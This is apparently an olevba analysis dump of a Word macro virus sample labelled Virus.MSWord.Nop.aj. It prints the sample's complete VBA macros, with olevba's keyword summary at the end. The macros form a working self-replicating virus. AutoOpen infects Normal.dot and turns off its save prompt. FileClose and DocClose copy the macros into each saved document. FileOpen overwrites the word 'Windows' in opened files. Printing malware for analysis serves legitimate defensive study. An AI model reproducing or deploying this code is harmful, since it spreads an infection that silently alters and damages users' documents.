olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HelpAbout.bas 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/HelpAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ===============================================================
Rem Some Joke from this Macro.
Rem ===============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Отображает информацию о программе и номер версии"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.HelpAbout.MAIN"

On Error GoTo -1: On Error GoTo Halt

WordBasic.HelpAbout APPNAME:="Sucks!"

Halt:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==============================================================
Rem Invecting module of this Macro.
Rem ==============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Закрывает все окна активного документа"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim W
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

W = WordBasic.IsDocumentDirty()
Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs Dlg
If Dlg.Format <= 1 Then
    If Dlg.Format = 0 Then
        Dlg.Format = 1
        WordBasic.FileSaveAs Dlg
    End If
    N$ = "Normal.Dot:"
    S$ = Dlg.Name + ":"
    WordBasic.MacroCopy N$ + "FileClose", S$ + "FileClose", 1
    WordBasic.MacroCopy N$ + "DocClose", S$ + "DocClose", 1
    WordBasic.MacroCopy N$ + "FileOpen", S$ + "FileOpen", 1
    WordBasic.MacroCopy N$ + "HelpAbout", S$ + "HelpAbout", 1
    WordBasic.MacroCopy N$ + "Internal", S$ + "AutoOpen", 1
    WordBasic.SetDocumentDirty W
End If


Halt:
Err.Number = 0
WordBasic.FileClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==================================================================
Rem Destructive operations from this Macro.
Rem ==================================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Открывает существующий документ или шаблон"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"

On Error GoTo -1: On Error GoTo Halt

Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen Dlg
WordBasic.Dialog.FileOpen Dlg
WordBasic.FileOpen Dlg

WordBasic.EditReplace Find:="Windows", Replace:="Sucks must die!", ReplaceAll:=1

Halt:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO DocClose.bas 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/DocClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==============================================================
Rem Invecting module of this Macro.
Rem ==============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Предлагает сохранить активный документ и закрывает активное окно"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DocClose.MAIN"
Dim W
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

W = WordBasic.IsDocumentDirty()
Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs Dlg
If Dlg.Format <= 1 Then
    If Dlg.Format = 0 Then
        Dlg.Format = 1
        WordBasic.FileSaveAs Dlg
    End If
    N$ = "Normal.Dot:"
    S$ = Dlg.Name + ":"
    WordBasic.MacroCopy N$ + "FileClose", S$ + "FileClose", 1
    WordBasic.MacroCopy N$ + "DocClose", S$ + "DocClose", 1
    WordBasic.MacroCopy N$ + "FileOpen", S$ + "FileOpen", 1
    WordBasic.MacroCopy N$ + "HelpAbout", S$ + "HelpAbout", 1
    WordBasic.MacroCopy N$ + "Internal", S$ + "AutoOpen", 1
    WordBasic.SetDocumentDirty W
End If


Halt:
Err.Number = 0
WordBasic.DocClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nop.aj-552ed8bad1c9f5331344a387b71f59ae25c22392 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem =================================================================
Rem StartUp Initialization.
Rem =================================================================



Public Sub MAIN()
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.ToolsOptionsSave(False)
WordBasic.CurValues.ToolsOptionsSave Dlg
Dlg.GlobalDotPrompt = 0
WordBasic.ToolsOptionsSave Dlg
If WordBasic.[MacroFileName$]("Internal") = "" Then
    N$ = "Normal.Dot:"
    S$ = WordBasic.[FileNameFromWindow$]() + ":"
    WordBasic.MacroCopy S$ + "FileClose", N$ + "FileClose", 1
    WordBasic.MacroCopy S$ + "DocClose", N$ + "DocClose", 1
    WordBasic.MacroCopy S$ + "FileOpen", N$ + "FileOpen", 1
    WordBasic.MacroCopy S$ + "HelpAbout", N$ + "HelpAbout", 1
    WordBasic.MacroCopy S$ + "AutoOpen", N$ + "Internal", 1
End If

Halt:
Err.Number = 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
